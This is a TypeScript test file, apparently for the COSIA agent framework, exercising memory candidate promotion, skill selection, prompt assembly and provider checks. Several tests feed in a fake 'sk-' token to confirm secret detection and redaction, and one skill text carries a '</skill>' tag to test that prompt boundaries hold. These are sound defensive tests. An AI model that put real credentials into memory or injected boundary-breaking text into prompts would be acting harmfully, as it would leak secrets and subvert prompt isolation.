  it("creates skill candidates from core memory without archiving the source", async () => {
    const root = await initializedWorkspace();
    const memory = new MemoryManager(root);
    const core = memory.addMemory({
      tier: "core",
      kind: "note",
      content: "When content includes token = \"sk-testsecret1234567890\", treat it as high risk.",
      importance: 4,
      confidence: 0.8
    });

    const result = memory.promoteCoreMemoryToSkillCandidate(core.id, {
      skillName: "Secret Memory Review",
      reason: "turn core rule into a skill candidate"
    });
    expect(memory.getMemory(core.id).status).toBe("active");
    expect(result.promotion.toTier).toBe("skill_candidate");
    expect(result.promotion.targetMemoryId).toBe(result.candidate.id);
    expect(result.candidate.riskLevel).toBe("high");
    expect(new SkillManager(root).getCandidate(result.candidate.id).record.content).toContain("token");
  });

  it("normalizes text and scores memory search results", async () => {
    const root = await initializedWorkspace();
    const memory = new MemoryManager(root);
    const record = memory.addMemory({
      scope: "project",
      kind: "decision",
      content: "COSIA v0.4 improves memory ranking.",
      importance: 5,
      confidence: 0.9
    });

    expect(normalizeMemoryText(" COSIA!\nMemory---Ranking ")).toBe("cosia memory ranking");
    const score = calculateMemoryScore("memory ranking", record);
    expect(score.score).toBeGreaterThan(10);
    expect(score.matchedTokens).toEqual(expect.arrayContaining(["memory", "ranking"]));
    expect(memory.search("memory ranking")[0].record.id).toBe(record.id);
  });

  it("updates, archives, and lists long-term memories by id prefix", async () => {
    const root = await initializedWorkspace();
    const memory = new MemoryManager(root);
    const record = memory.addMemory({
      scope: "project",
      kind: "note",
      content: "Initial memory lifecycle note."
    });

    const updated = memory.updateMemory(record.id.slice(0, 12), {
      content: "Updated memory lifecycle decision.",
      kind: "decision",
      importance: 5,
      confidence: 0.95
    });
    expect(updated.content).toContain("Updated");
    expect(memory.getMemory(record.id.slice(0, 12)).kind).toBe("decision");

    const archived = memory.archiveMemory(record.id.slice(0, 12), "test archive");
    expect(archived.status).toBe("archived");
    expect(memory.listMemories()).toHaveLength(0);
    expect(memory.listMemories(20, true).map((item) => item.status)).toContain("archived");
    expect(memory.search("Updated memory lifecycle")).toHaveLength(0);
  });

  it("appends, promotes, and discards memory candidates", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Review memory candidates");
    const memory = new MemoryManager(root);

    await memory.appendCandidates([
      {
        scope: "project",
        kind: "decision",
        content: "COSIA v0.2 reviews memory candidates before promotion.",
        importance: 4,
        confidence: 0.9
      },
      {
        scope: "tool",
        kind: "note",
        content: "Discard this candidate in tests.",
        importance: 2,
        confidence: 0.5
      }
    ], session);

    const pending = await memory.listCandidates();
    expect(pending).toHaveLength(2);
    expect(pending[0].record?.id).toBeTruthy();
    expect(pending[0].record?.status).toBe("pending");
    expect(pending[0].record?.sourceSessionId).toBe(session.id);
    expect(pending[0].record?.sourceAgentId).toBe(session.assignedAgentId);

    const candidatePrefix = pending[0].displayId.slice(0, 12);
    expect((await memory.getCandidate(candidatePrefix)).displayId).toBe(pending[0].displayId);

    const promoted = await memory.promoteCandidate(candidatePrefix);
    expect(promoted.content).toContain("reviews memory candidates");
    expect(memory.search("reviews memory candidates")).toHaveLength(1);

    const discarded = await memory.discardCandidate(pending[1].displayId.slice(0, 12), "test discard");
    expect(discarded.status).toBe("discarded");
    expect(discarded.discardReason).toBe("test discard");

    const all = await memory.listCandidates(true);
    expect(all.map((item) => item.record?.status)).toEqual(["promoted", "discarded"]);
  });

  it("automatically cleans discarded memory candidates after seven days", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Discard cleanup");
    const memory = new MemoryManager(root);
    await memory.appendCandidates([{
      tier: "session",
      kind: "note",
      content: "Discarded candidate should expire.",
      importance: 2,
      confidence: 0.5
    }], session, "run-cleanup", "cosia-agent");
    const candidate = (await memory.listCandidates())[0].record;
    expect(candidate).toBeTruthy();
    await memory.discardCandidate(candidate!.id, "cleanup test");

    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      const record = (await memory.getCandidate(candidate!.id)).record!;
      const oldRecord = {
        ...record,
        reviewedAt: "2026-01-01T00:00:00.000Z"
      };
      db.prepare("UPDATE memory_candidates SET record_json = ?, reviewed_at = ? WHERE id = ?")
        .run(JSON.stringify(oldRecord), oldRecord.reviewedAt, oldRecord.id);
    } finally {
      db.close();
    }

    expect((await memory.listCandidates(true)).some((entry) => entry.displayId === candidate!.id)).toBe(false);
  });

  it("migrates JSONL candidate and promotion queues into SQLite once", async () => {
    const root = await initializedWorkspace();
    const validCandidate = {
      id: "candidate-jsonl-001",
      status: "pending" as const,
      scope: "project" as const,
      kind: "note",
      content: "Migrated candidate memory",
      importance: 3,
      confidence: 0.8,
      sourceSessionId: "session-jsonl",
      sourceAgentId: "architect-agent",
      createdAt: "2026-05-20T00:00:00.000Z"
    };
    const legacyCandidate = {
      scope: "project",
      kind: "note",
      content: "Legacy candidate without v0.2 id",
      importance: 3,
      confidence: 0.8
    };
    const validPromotion = {
      id: "promotion-jsonl-001",
      candidateId: validCandidate.id,
      promotedMemoryId: "memory-jsonl-001",
      sessionId: "session-jsonl",
      agentId: "architect-agent",
      riskLevel: "low" as const,
      reasons: ["test migration"],
      policyMode: "conservative" as const,
      createdAt: "2026-05-20T00:00:01.000Z"
    };
    await writeFile(join(root, "memory", "memory_candidates.jsonl"), `${JSON.stringify(validCandidate)}\n${JSON.stringify(legacyCandidate)}\n`, "utf8");
    await writeFile(join(root, "memory", "auto_promotions.jsonl"), `${JSON.stringify(validPromotion)}\n`, "utf8");

    const memory = new MemoryManager(root);
    const candidates = await memory.listCandidates(true);
    expect(candidates).toHaveLength(1);
    expect(candidates[0].displayId).toBe(validCandidate.id);
    expect(memory.listPromotions(true)).toHaveLength(1);
    expect(memory.exportCandidatesJsonl()).toContain(validCandidate.id);
    expect(memory.exportPromotionsJsonl()).toContain(validPromotion.id);

    expect(await readFile(join(root, "memory", "memory_candidates.jsonl.bak"), "utf8")).toContain(validCandidate.id);
    const report = JSON.parse(await readFile(join(root, "memory", "queue_migration_report.json"), "utf8")) as {
      migrations: Array<{ source: string; imported: number; skippedLegacy: number }>;
    };
    expect(report.migrations.find((item) => item.source === "memory_candidates.jsonl")).toMatchObject({
      imported: 1,
      skippedLegacy: 1
    });

    await writeFile(join(root, "memory", "memory_candidates.jsonl"), `${JSON.stringify(validCandidate)}\n`, "utf8");
    expect(await memory.listCandidates(true)).toHaveLength(1);
  });

  it("blocks conflicting candidate promotion and supports replace resolution", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Resolve memory conflicts");
    const memory = new MemoryManager(root);
    const existing = memory.addMemory({
      scope: "project",
      kind: "decision",
      content: "COSIA v0.4 improves memory ranking.",
      importance: 5,
      confidence: 0.9
    });

    await memory.appendCandidates([{
      scope: "project",
      kind: "decision",
      content: "cosia v0.4 improves memory ranking",
      importance: 4,
      confidence: 0.8
    }], session);

    const candidate = (await memory.listCandidates())[0];
    const conflictResult = await memory.findCandidateConflicts(candidate.displayId.slice(0, 12));
    expect(conflictResult.conflicts[0].type).toBe("duplicate");
    expect(formatMemoryConflicts(conflictResult.candidate, conflictResult.conflicts)).toContain("duplicate");
    await expect(memory.promoteCandidate(candidate.displayId.slice(0, 12))).rejects.toThrow("Memory candidate conflicts detected");

    const promoted = await memory.promoteCandidate(candidate.displayId.slice(0, 12), {
      replaceMemoryId: existing.id.slice(0, 12)
    });
    expect(promoted.content).toContain("cosia v0.4");
    expect(memory.getMemory(existing.id).status).toBe("archived");
    expect(memory.search("memory ranking").map((result) => result.record.id)).toContain(promoted.id);
  });

  it("supports force and merge candidate promotion modes", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Force and merge memory candidates");
    const memory = new MemoryManager(root);
    const existing = memory.addMemory({
      scope: "project",
      kind: "note",
      content: "Memory intelligence ranks durable context.",
      importance: 3,
      confidence: 0.7
    });

    await memory.appendCandidates([
      {
        scope: "project",
        kind: "note",
        content: "Memory intelligence ranks durable context",
        importance: 3,
        confidence: 0.7
      },
      {
        scope: "project",
        kind: "note",
        content: "Memory intelligence ranks durable project context.",
        importance: 5,
        confidence: 0.9
      }
    ], session);

    const [forceCandidate, mergeCandidate] = await memory.listCandidates();
    const forced = await memory.promoteCandidate(forceCandidate.displayId.slice(0, 12), { force: true });
    expect(forced.id).not.toBe(existing.id);

    const merged = await memory.promoteCandidate(mergeCandidate.displayId.slice(0, 12), {
      mergeMemoryId: existing.id.slice(0, 12),
      mergeContent: "Memory intelligence ranks durable project context for COSIA."
    });
    expect(merged.id).toBe(existing.id);
    expect(memory.getMemory(existing.id).content).toContain("COSIA");
  });

  it("classifies secret-like candidates as high risk with redaction", async () => {
    const candidate = {
      id: "candidate-secret",
      status: "pending" as const,
      tier: "core" as const,
      scope: "project" as const,
      legacyScope: "project" as const,
      kind: "decision",
      content: "Use token = \"sk-testsecret1234567890\" for local auth.",
      importance: 3,
      confidence: 0.8,
      sourceSessionId: "session-test",
      sourceAgentId: "architect-agent",
      createdAt: new Date().toISOString()
    };

    const secret = detectSecrets(candidate.content);
    expect(secret.matched).toBe(true);
    expect(secret.redactedPreview).toContain("[REDACTED]");
    const classification = classifyMemoryCandidate(candidate, false);
    expect(classification.riskLevel).toBe("high");
    expect(classification.autoPromotable).toBe(false);
  });

  it("auto-promotes low-risk no-conflict candidates and can revert them", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Auto promote safe memory");
    const events: string[] = [];

    await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_SESSION_CANDIDATE] auto promote safe memory",
      providerId: "mock",
      onEvent: (message) => events.push(message)
    });

    expect(events.some((event) => event.includes("memory review: 1 candidates, 1 auto-promoted"))).toBe(true);
    const memory = new MemoryManager(root);
    const promotions = memory.listPromotions();
    expect(promotions).toHaveLength(1);
    expect((await memory.listCandidates(true))[0].record?.status).toBe("auto_promoted");
    const improveRecords = new SelfImprovementGovernor(root).listRecords(true).filter((record) => record.type === "memory_auto_promote");
    expect(improveRecords).toHaveLength(1);
    expect(improveRecords[0].status).toBe("applied");

    const reverted = memory.revertPromotion(promotions[0].id.slice(0, 12), "test revert");
    expect(reverted.revertedAt).toBeTruthy();
    expect(memory.getMemory(promotions[0].promotedMemoryId).status).toBe("archived");
    expect((await memory.listCandidates(true))[0].record?.status).toBe("reverted");
  });

  it("keeps conflicting candidates pending after a run", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Keep conflicts pending");
    const memory = new MemoryManager(root);
    memory.addMemory({
      scope: "project",
      kind: "note",
      content: "Mock candidate memory",
      importance: 3,
      confidence: 0.8
    });
    const events: string[] = [];

    await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_CANDIDATE] conflict pending memory",
      providerId: "mock",
      onEvent: (message) => events.push(message)
    });

    expect(events.some((event) => event.includes("memory review: 1 candidates, 0 auto-promoted, 1 pending, 1 conflicts"))).toBe(true);
    expect(memory.listPromotions()).toHaveLength(0);
    expect((await memory.listCandidates())[0].record?.status).toBe("pending");
  });

  it("records deduped tool candidate recommendation evidence from repeated shell approvals", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Repeated shell recommendation");
    const shell = new ShellApprovalLedger(root);
    for (let index = 0; index < 2; index += 1) {
      const approval = shell.create({
        command: "node --version",
        reason: "Project check command was approved for one-shot shell execution.",
        expectedEffect: "May inspect project runtime output.",
        sourceSessionId: session.id,
        sourceAgentId: "architect-agent",
        sourceRunId: `run-${index}`,
        sourceChannel: "cli"
      });
      const applied = await shell.apply(approval.id);
      expect(applied.ok).toBe(true);
    }

    const policy = await new PolicyManager(root).loadPolicy();
    const governor = new SelfImprovementGovernor(root);
    await governor.afterRun({
      policy,
      session,
      agentId: "architect-agent",
      runId: "run-rec",
      memoryCandidates: [],
      skillCandidates: []
    });
    await governor.afterRun({
      policy,
      session,
      agentId: "architect-agent",
      runId: "run-rec-2",
      memoryCandidates: [],
      skillCandidates: []
    });

    const recommendations = governor.listRecords(true).filter((record) => record.type === "tool_recommendation"
      && record.evidence.recommendationKind === "tool_candidate");
    expect(recommendations).toHaveLength(1);
    expect(recommendations[0].status).toBe("previewed");
    expect(recommendations[0].evidence.sourceShellApprovalIds).toHaveLength(2);
  });

  it("defaults candidate owners by tier and keeps non-session candidates pending", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Candidate tier defaults");

    await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_CORE_CANDIDATE]",
      providerId: "mock"
    });
    await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_AGENT_CANDIDATE]",
      providerId: "mock"
    });

    const candidates = await new MemoryManager(root).listCandidates(true);
    const agentCandidate = candidates.find((candidate) => candidate.record?.tier === "agent")?.record;
    const coreCandidate = candidates.find((candidate) => candidate.record?.tier === "core")?.record;
    expect(agentCandidate).toMatchObject({ ownerId: "architect-agent", status: "pending" });
    expect(coreCandidate).toMatchObject({ status: "pending" });
    expect(coreCandidate?.ownerId).toBeUndefined();
  });
});

describe("skills", () => {
  it("stores skill candidates and promotes them into the global skill toolbox", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Skill candidate loop");

    const skills = new SkillManager(root);
    skills.appendCandidates([{
      agentId: "architect-agent",
      skillName: "Git Commit Convention",
      reason: "Mock skill candidate.",
      content: "When asked about git commits, inspect git status and write concise commit messages.",
      triggers: ["git", "commit"]
    }], session);
    const candidates = skills.listCandidates();
    expect(candidates).toHaveLength(1);
    expect(candidates[0].record.skillId).toBe("git-commit-convention");

    const preview = skills.promoteCandidate(candidates[0].displayId.slice(0, 12));
    expect(preview.changed).toBe(false);
    await expect(readFile(join(root, "skills", "git-commit-convention.md"), "utf8")).rejects.toThrow();

    const promoted = skills.promoteCandidate(candidates[0].displayId.slice(0, 12), {
      yes: true,
      preferFor: "architect-agent"
    });
    expect(promoted.changed).toBe(true);
    expect(await readFile(join(root, "skills", "git-commit-convention.md"), "utf8")).toContain("git commits");
    expect(await readFile(join(root, "skills", "git-commit-convention.json"), "utf8")).toContain("\"triggers\"");
    const manifest = JSON.parse(await readFile(join(root, "agents", "architect-agent", "manifest.json"), "utf8")) as {
      preferredSkills: string[];
    };
    expect(manifest.preferredSkills).toContain("git-commit-convention");
    expect(await readFile(join(root, "skills", "SKILLS.md"), "utf8")).toContain("git-commit-convention");
    expect(await readFile(join(root, "agents", "architect-agent", "SKILLS.md"), "utf8")).toContain("git-commit-convention");
  });

  it("auto-promotes low-risk skill candidates through the Governor and can revert them", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Auto skill improvement");
    const events: string[] = [];

    await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_SKILL_CANDIDATE] propose a git skill",
      providerId: "mock",
      onEvent: (message) => events.push(message)
    });

    expect(events.some((event) => event.includes("[improve] memory/skill applied:1"))).toBe(true);
    expect(await readFile(join(root, "skills", "git-commit-convention.md"), "utf8")).toContain("git commits");
    const skills = new SkillManager(root);
    expect(skills.listCandidates(true)[0].record.status).toBe("promoted");
    const improve = new SelfImprovementGovernor(root);
    const records = improve.listRecords(true).filter((record) => record.type === "skill_auto_promote");
    expect(records).toHaveLength(1);
    expect(records[0].status).toBe("applied");
    expect(records[0].policySnapshot).not.toHaveProperty("connectors");

    const reverted = await improve.revert(records[0].id, "test revert");
    expect(reverted.status).toBe("reverted");
    await expect(readFile(join(root, "skills", "git-commit-convention.md"), "utf8")).rejects.toThrow();
    expect(skills.listCandidates(true)[0].record.status).toBe("reverted");
  });

  it("keeps triggerless skill candidates pending in Governor preview", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Triggerless skill");
    const skills = new SkillManager(root);
    skills.appendCandidates([{
      agentId: "cosia-agent",
      skillName: "No Trigger Skill",
      reason: "No trigger test.",
      content: "Only use manually.",
      triggers: [],
      riskLevel: "low"
    }], session);
    const policy = await new PolicyManager(root).loadPolicy();
    const preview = await new SelfImprovementGovernor(root).preview(policy);

    expect(preview.decisions.some((decision) => decision.type === "skill_auto_promote" && !decision.eligible && decision.rationale.includes("missing trigger"))).toBe(true);
    expect(skills.listCandidates()[0].record.status).toBe("pending");
  });

  it("warns on manual-only skill promotion and blocks duplicate skill ids", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Manual skills");
    const skills = new SkillManager(root);

    const [candidate] = skills.appendCandidates([{
      agentId: "architect-agent",
      skillName: "Manual Only Skill",
      reason: "Test manual-only skill.",
      content: "Only use this when explicitly selected.",
      triggers: []
    }], session);
    const preview = skills.promoteCandidate(candidate.id);
    expect(preview.warning).toContain("manual-only");
    skills.promoteCandidate(candidate.id, { yes: true });
    const cleanCheck = skills.checkSkills();
    expect(cleanCheck.ok).toBe(true);
    expect(cleanCheck.manualOnlySkills).toContain("manual-only-skill");

    await writeFile(join(root, "skills", "SKILLS.md"), "# stale skills\n", "utf8");
    await writeFile(join(root, "skills", "orphan.md"), "# Orphan\n", "utf8");
    const staleCheck = skills.checkSkills();
    expect(staleCheck.ok).toBe(false);
    expect(staleCheck.mirrorMatches).toBe(false);
    expect(staleCheck.orphanSkillFiles).toContain("orphan");
    const repaired = skills.checkSkills(undefined, true);
    expect(repaired.ok).toBe(true);
    expect(repaired.repaired).toBe(true);
    expect(repaired.orphanSkillFiles).toContain("orphan");
    expect(await readFile(join(root, "skills", "SKILLS.md"), "utf8")).toContain("manual-only-skill");

    const [duplicate] = skills.appendCandidates([{
      agentId: "architect-agent",
      skillName: "Manual Only Skill",
      reason: "Duplicate.",
      content: "Duplicate content.",
      triggers: ["manual"]
    }], session);
    expect(() => skills.promoteCandidate(duplicate.id, { yes: true })).toThrow("Skill already exists");
  });

  it("classifies secret-like skill candidates as high risk with redaction", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Secret skill");
    const skills = new SkillManager(root);

    const [candidate] = skills.appendCandidates([{
      agentId: "architect-agent",
      skillName: "Secret Handling Skill",
      reason: "Secret test.",
      content: "Use token = \"sk-testsecret1234567890\" for local auth.",
      triggers: ["secret handling"],
      riskLevel: "low"
    }], session);
    expect(candidate.riskLevel).toBe("high");
    const preview = skills.promoteCandidate(candidate.id);
    expect(preview.record.riskLevel).toBe("high");
    expect(() => skills.promoteCandidate(candidate.id, { yes: true })).toThrow("High-risk skill promotion requires");
  });

  it("selects trigger-matched and manual skills with XML boundaries and prompt budgeting", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "장기기억 설계");
    const skills = new SkillManager(root);

    const records = skills.appendCandidates([
      {
        agentId: "architect-agent",
        skillName: "Git Skill",
        reason: "Git operations.",
        content: "Use git tools when the user asks about git diff or status.",
        triggers: ["git"]
      },
      {
        agentId: "architect-agent",
        skillName: "Memory Skill",
        reason: "Memory operations.",
        content: "Use scored memory when the user asks about 장기기억.",
        triggers: ["장기기억"]
      },
      {
        agentId: "architect-agent",
        skillName: "Manual Skill",
        reason: "Manual operations.",
        content: "This contains </skill> and should not break prompt boundaries.",
        triggers: []
      }
    ], session);
    for (const record of records) {
      skills.promoteCandidate(record.id, { yes: true });
    }
    skills.preferSkill("memory-skill", "architect-agent", 2);
    const agent = await agents.loadAgent("architect-agent");
    const policy = await new PolicyManager(root).loadPolicy();

    const gitPrompt = await buildPromptBundle({
      workspaceRoot: root,
      agent,
      session,
      userPrompt: "git diff를 요약해줘",
      policy
    });
    expect(gitPrompt.prompt).toContain("<available_skills>");
    expect(gitPrompt.prompt).toContain("git-skill");
    expect(gitPrompt.prompt).not.toContain("manual-skill");
    expect(gitPrompt.manifest.skillSelections?.some((item) => item.skillId === "git-skill" && item.selected)).toBe(true);
    const memorySelection = gitPrompt.manifest.skillSelections?.find((item) => item.skillId === "memory-skill");
    expect(memorySelection?.preferredBonus).toBe(3);
    expect(memorySelection?.weightBonus).toBe(2);

    const manualPrompt = await buildPromptBundle({
      workspaceRoot: root,
      agent,
      session,
      userPrompt: "일반 요청",
      policy: {
        ...policy,
        promptBudget: {
          ...policy.promptBudget,
          skillMaxItems: 1
        }
      },
      manualSkillIds: ["manual-skill"]
    });
    expect(manualPrompt.prompt).toContain("manual-skill");
    expect(manualPrompt.prompt).toContain("<\\/skill>");
    expect(manualPrompt.manifest.skillSelections?.some((item) => item.skillId === "memory-skill" && item.omittedReason === "skillMaxItems")).toBe(true);

    skills.blockSkill("git-skill", "architect-agent");
    const blockedAgent = await agents.loadAgent("architect-agent");
    await expect(buildPromptBundle({
      workspaceRoot: root,
      agent: blockedAgent,
      session,
      userPrompt: "git diff",
      policy,
      manualSkillIds: ["git-skill"]
    })).rejects.toThrow("Skill is blocked");
  });

  it("scores skill triggers without substring false positives and prioritizes current requests", () => {
    expect(calculateSkillTriggerMatch({
      skillId: "test-skill",
      triggers: ["test"],
      sessionGoal: "",
      currentRequest: "latest build"
    }).score).toBe(0);
    expect(calculateSkillTriggerMatch({
      skillId: "git-skill",
      triggers: ["git"],
      sessionGoal: "",
      currentRequest: "git diff 확인"
    }).score).toBe(5);
    expect(calculateSkillTriggerMatch({
      skillId: "memory-skill",
      triggers: ["장기기억"],
      sessionGoal: "",
      currentRequest: "장기기억 검색"
    }).score).toBe(5);
    expect(calculateSkillTriggerMatch({
      skillId: "goal-only",
      triggers: ["sqlite"],
      sessionGoal: "sqlite memory design",
      currentRequest: ""
    }).score).toBeLessThan(calculateSkillTriggerMatch({
      skillId: "request",
      triggers: ["sqlite"],
      sessionGoal: "",
      currentRequest: "sqlite 상태 확인"
    }).score);
    expect(calculateSkillTriggerMatch({
      skillId: "short",
      triggers: ["go"],
      sessionGoal: "go",
      currentRequest: "go"
    }).score).toBe(0);
  });

  it("selects skills deterministically and explains score breakdowns", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Tie skill selection");
    const skills = new SkillManager(root);
    const records = skills.appendCandidates([
      {
        agentId: "architect-agent",
        skillName: "Beta Skill",
        reason: "Tie beta.",
        content: "Beta instructions.",
        triggers: ["tie"]
      },
      {
        agentId: "architect-agent",
        skillName: "Alpha Skill",
        reason: "Tie alpha.",
        content: "Alpha instructions.",
        triggers: ["tie"]
      }
    ], session);
    for (const record of records) {
      skills.promoteCandidate(record.id, { yes: true });
    }
    const agent = await agents.loadAgent("architect-agent");
    const policy = await new PolicyManager(root).loadPolicy();
    const rows = skills.explainSkillSelection({
      agent,
      sessionGoal: "",
      currentRequest: "tie",
      budget: {
        skillMaxItems: policy.promptBudget.skillMaxItems,
        skillMaxChars: policy.promptBudget.skillMaxChars,
        skillItemMaxChars: policy.promptBudget.skillItemMaxChars
      }
    }).filter((row) => row.status === "SELECTED");
    expect(rows.map((row) => row.skillId)).toEqual(["alpha-skill", "beta-skill"]);

    skills.preferSkill("beta-skill", "architect-agent", 2);
    const preferredAgent = await agents.loadAgent("architect-agent");
    const preferredRows = skills.explainSkillSelection({
      agent: preferredAgent,
      sessionGoal: "",
      currentRequest: "tie",
      budget: {
        skillMaxItems: policy.promptBudget.skillMaxItems,
        skillMaxChars: policy.promptBudget.skillMaxChars,
        skillItemMaxChars: policy.promptBudget.skillItemMaxChars
      }
    }).filter((row) => row.status === "SELECTED");
    expect(preferredRows[0]).toMatchObject({
      skillId: "beta-skill",
      preferredBonus: 3,
      weightBonus: 2,
      finalScore: 10
    });
  });
});

describe("model parsing and run loop", () => {
  it("parses final and tool_call AgentStep JSON", () => {
    expect(parseModelOutput('{"type":"final","content":"done","memoryCandidates":[]}').step.type).toBe("final");
    expect(parseModelOutput('```json\n{"type":"tool_call","tool":"read_file","args":{"path":"README.md"}}\n```').step.type).toBe("tool_call");
    expect(parseModelOutput('{"type":"final","content":"done"}{"type":"final","content":"duplicate"}').step).toMatchObject({
      type: "final",
      content: "done"
    });
    expect(() => parseModelOutput('{"type":"final"}')).toThrow();
  });

  it("formats structured retry instructions with parse error and output preview", () => {
    const instruction = modelInstructionForRetry(new Error("Unexpected token"), "not-json");
    expect(instruction).toContain("You returned invalid JSON. Fix the error below and return ONLY valid AgentStep JSON.");
    expect(instruction).toContain("Unexpected token");
    expect(instruction).toContain("not-json");
  });

  it("classifies provider registry disabled and unknown providers", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();

    expect(() => createProvider("openai-compatible", root, { policy })).toThrow(ProviderError);
    const disabled = await checkProvider("openai-compatible", root, policy);
    expect(disabled).toMatchObject({ ok: false, reason: "disabled" });
    const openrouterDisabled = await checkProvider("openrouter", root, policy);
    expect(openrouterDisabled).toMatchObject({ id: "openrouter", ok: false, reason: "disabled" });

    const unknown = await checkProvider("missing-provider", root, policy);
    expect(unknown).toMatchObject({ ok: false, reason: "unknown_provider" });

    const listed = listProviders(policy);
    expect(listed.some((provider) => provider.id === "openai-codex" && provider.type === "openai-codex")).toBe(true);
    expect(listed.some((provider) => provider.id === "codex-cli" && !provider.isDefault)).toBe(true);
    expect(listed.some((provider) => provider.id === "openrouter" && provider.type === "openai-compatible")).toBe(true);
    expect(listed.some((provider) => provider.id === "mock" && provider.enabled)).toBe(true);
  });

  it("repairs v0.15 provider policy shape with provider types and OpenRouter preset", async () => {
    const parsed = policyConfigSchema.parse({
      version: "0.15.0",
      tools: {
        read_file: { permission: "read_only", workspace: "inside_only", enabled: true },
        write_file: { permission: "write_local", workspace: "inside_only", enabled: true },
        search_files: { permission: "read_only", workspace: "inside_only", enabled: true },
        git_status: { permission: "read_only", workspace: "inside_only", enabled: true },
        git_diff: { permission: "read_only", workspace: "inside_only", enabled: true },
        git_log: { permission: "read_only", workspace: "inside_only", enabled: true },
        npm_test: { permission: "read_only", workspace: "inside_only", enabled: true },
        npm_typecheck: { permission: "read_only", workspace: "inside_only", enabled: true }
      },
      disabledPermissions: ["destructive", "network", "external_send", "shell"],
      overwrite: { existingFileRequiresApproval: true },
      requireTools: { observationTools: ["read_file", "search_files"], writeFileSatisfies: false },
      fileInspection: { requiresReadFile: true, triggerPhrases: ["read_file"] },
      memory: {
        longTermWrite: "candidate_promote_only",
        candidateScopes: ["global", "user", "codex", "agent", "project", "session", "task", "tool"]
      },
      model: {
        defaultProvider: "codex-cli",
        providers: {
          "codex-cli": { enabled: true, sandbox: "read-only" },
          "openai-compatible": { enabled: false, baseUrl: null, model: null }
        }
      }
    });
    const repaired = normalizePolicy(parsed);
    expect(repaired.model.providers["openai-codex"].type).toBe("openai-codex");
    expect(repaired.model.providers["codex-cli"].type).toBe("codex-cli");
    expect(repaired.model.providers["openai-compatible"].type).toBe("openai-compatible");
    expect(repaired.model.providers.openrouter).toMatchObject({
      type: "openai-compatible",
      enabled: false,
      baseUrl: "https://openrouter.ai/api/v1",
      apiKeyEnv: "OPENROUTER_API_KEY",
      responseFormat: "json_object"
    });
  });

  it("checks OpenRouter missing config and missing API key states", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();
    policy.model.providers.openrouter.enabled = true;
    policy.model.providers.openrouter.model = null;
    expect(await checkProvider("openrouter", root, policy)).toMatchObject({ ok: false, reason: "missing_config" });

    policy.model.providers.openrouter.model = "openai/gpt-test";
    const previous = process.env.OPENROUTER_API_KEY;
    delete process.env.OPENROUTER_API_KEY;
    try {
      expect(await checkProvider("openrouter", root, policy)).toMatchObject({ ok: false, reason: "missing_api_key" });
    } finally {
      if (previous === undefined) {
        delete process.env.OPENROUTER_API_KEY;
      } else {
        process.env.OPENROUTER_API_KEY = previous;
      }
    }
  });

  it("checks openai-compatible missing config and missing api key distinctly", async () => {
    const missingConfig = new OpenAICompatibleProvider({
      enabled: true,
      baseUrl: null,
      model: "test-model",
      apiKeyEnv: "COSIA_TEST_KEY",
      endpointPath: "/chat/completions",
      timeoutMs: 1000,
      structuredRetryCount: 1,
      maxPromptChars: 60000
    });
    expect(await missingConfig.checkAuth()).toMatchObject({ ok: false, reason: "missing_config" });

    const previous = process.env.COSIA_TEST_KEY;
    delete process.env.COSIA_TEST_KEY;
    try {
      const missingKey = new OpenAICompatibleProvider({
        enabled: true,
        baseUrl: "https://example.invalid",
        model: "test-model",
        apiKeyEnv: "COSIA_TEST_KEY",
        endpointPath: "/chat/completions",
        timeoutMs: 1000,
        structuredRetryCount: 1,
        maxPromptChars: 60000
      });
